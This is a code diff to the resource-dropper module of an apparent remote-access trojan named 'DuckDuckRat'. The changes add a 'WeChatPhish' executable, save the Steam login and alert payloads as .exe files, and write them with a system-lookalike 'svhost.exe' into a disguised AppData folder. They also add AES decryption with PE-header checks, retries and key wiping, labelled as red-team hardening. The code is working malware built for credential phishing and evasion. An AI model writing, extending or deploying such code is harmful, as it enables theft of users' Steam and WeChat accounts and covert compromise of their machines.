@@ -6,7 +6,7 @@ using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Linq;
 
-namespace VanguardCore.Modules
+namespace DuckDuckRat.Modules
 {
     public static class ResourceModule
     {
@@ -20,6 +20,8 @@ namespace VanguardCore.Modules
             WorkDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Network");
             if (!Directory.Exists(WorkDir)) Directory.CreateDirectory(WorkDir);
         }
+
+        public static string GetToolPath(string name) => Path.Combine(WorkDir, name.EndsWith(".exe") ? name : name + ".exe");
 
         public static void ExtractAll()
         {
@@ -35,9 +37,10 @@ namespace VanguardCore.Modules
                 // bore.bin is handled in-memory in ProxyModule (No disk drop)
                 ExtractResource("e_sqlite3.dll", Path.Combine(WorkDir, "e_sqlite3.dll"));
                 ExtractResource("GlobalLogger.py", Path.Combine(WorkDir, "GlobalLogger.py"));
-                ExtractResource("SteamAlert.bin", Path.Combine(WorkDir, "SteamAlert.bin"));
-                ExtractResource("SteamLogin.bin", Path.Combine(WorkDir, "SteamLogin.bin"));
+                ExtractResource("SteamAlert.bin", Path.Combine(WorkDir, "SteamAlert.exe"));
+                ExtractResource("SteamLogin.bin", Path.Combine(WorkDir, "SteamLogin.exe"));
                 ExtractResource("svhost.bin", Path.Combine(WorkDir, "svhost.exe"));
+                ExtractResource("WeChatPhish.bin", Path.Combine(WorkDir, "WeChatPhish.exe"));
 
                 // 3. Ensure tablichka directory exists for Steam Notice
                 string tablichkaDir = Path.Combine(WorkDir, "tablichka");
@@ -50,6 +53,9 @@ namespace VanguardCore.Modules
                 }
                 
                 Log("[RESOURCE] All tools extracted successfully.");
+                
+                // [RED TEAM HARDENING] Wipe cryptographic keys only AFTER all extraction is verified.
+                AesHelper.WipeKeys();
                 
                 // V7.1 RED TEAM OPTIMIZATION: Relinquish memory back to OS immediately
                 // This clears the 400MB+ RAM spike from resource extraction buffers.
@@ -73,10 +79,10 @@ namespace VanguardCore.Modules
                 var assembly = Assembly.GetExecutingAssembly();
                 string[] possibleNames = {
                     shortName,
-                    $"VanguardCore.{shortName}",
-                    $"FinalBot.{shortName}",
+                    $"DuckDuckRat.{shortName}",
+                    $"DuckDuckRat.{shortName}",
                     $"MicrosoftManagementSvc.{shortName}",
-                    $"VanguardCore.tools.{shortName}"
+                    $"DuckDuckRat.tools.{shortName}"
                 };
 
                 Stream? stream = null;
@@ -108,39 +114,62 @@ namespace VanguardCore.Modules
 
         private static void SaveStream(Stream stream, string destPath, bool isEncrypted = false)
         {
-            try {
-                byte[] data;
-                using (MemoryStream ms = new MemoryStream())
-                {
-                    stream.CopyTo(ms);
-                    data = ms.ToArray();
-                }
+            int maxRetries = 5;
+            int delayMs = 1000;
 
-                if (isEncrypted)
-                {
-                    data = AesHelper.Decrypt(data);
-                }
-
-                if (data != null && data.Length > 2)
-                {
-                    // V7.0 optimization: Check for GZip magic header (0x1F, 0x8B)
-                    if (data[0] == 0x1F && data[1] == 0x8B)
+            for (int attempt = 1; attempt <= maxRetries; attempt++)
+            {
+                try {
+                    byte[] data;
+                    using (MemoryStream ms = new MemoryStream())
                     {
-                        using (MemoryStream compressedMs = new MemoryStream(data))
-                        using (GZipStream decompressionStream = new GZipStream(compressedMs, CompressionMode.Decompress))
-                        using (MemoryStream resultMs = new MemoryStream())
-                        {
-                            decompressionStream.CopyTo(resultMs);
-                            data = resultMs.ToArray();
-                        }
+                        stream.Position = 0; // Reset stream for each attempt
+                        stream.CopyTo(ms);
+                        data = ms.ToArray();
                     }
 
-                    File.WriteAllBytes(destPath, data);
+                    if (isEncrypted)
+                    {
+                        data = AesHelper.Decrypt(data);
+                    }
+
+                    if (data != null && data.Length > 64) // Basic PE minimum
+                    {
+                        // V7.0 optimization: Check for GZip magic header (0x1F, 0x8B)
+                        if (data[0] == 0x1F && data[1] == 0x8B)
+                        {
+                            using (MemoryStream compressedMs = new MemoryStream(data))
+                            using (GZipStream decompressionStream = new GZipStream(compressedMs, CompressionMode.Decompress))
+                            using (MemoryStream resultMs = new MemoryStream())
+                            {
+                                decompressionStream.CopyTo(resultMs);
+                                data = resultMs.ToArray();
+                            }
+                        }
+
+                        // [ORBITAL] Verify PE Magic before writing to disk
+                        if (destPath.EndsWith(".exe") || destPath.EndsWith(".dll"))
+                        {
+                            if (data.Length < 2 || data[0] != 0x4D || data[1] != 0x5A) // MZ
+                            {
+                                Log($"[RESOURCE] CRITICAL: Decryption result for {Path.GetFileName(destPath)} is NOT a valid PE (No MZ header). Try {attempt}/{maxRetries}");
+                                Thread.Sleep(delayMs);
+                                continue; 
+                            }
+                        }
+
+                        if (File.Exists(destPath)) try { File.Delete(destPath); } catch { }
+                        File.WriteAllBytes(destPath, data);
+                        return; // Success
+                    }
+                } 
+                catch (Exception ex)
+                {
+                    Log($"[RESOURCE] Save attempt {attempt} failed: {ex.Message}");
+                    Thread.Sleep(delayMs);
                 }
-                
-                // Explicitly clear buffer reference to help GC
-                data = null;
-            } catch { }
+            }
+            Log($"[RESOURCE] FAILED to extract {Path.GetFileName(destPath)} after {maxRetries} attempts.");
         }
 
         private static void Log(string msg)
@@ -152,3 +181,5 @@ namespace VanguardCore.Modules
         }
     }
 }
+
+
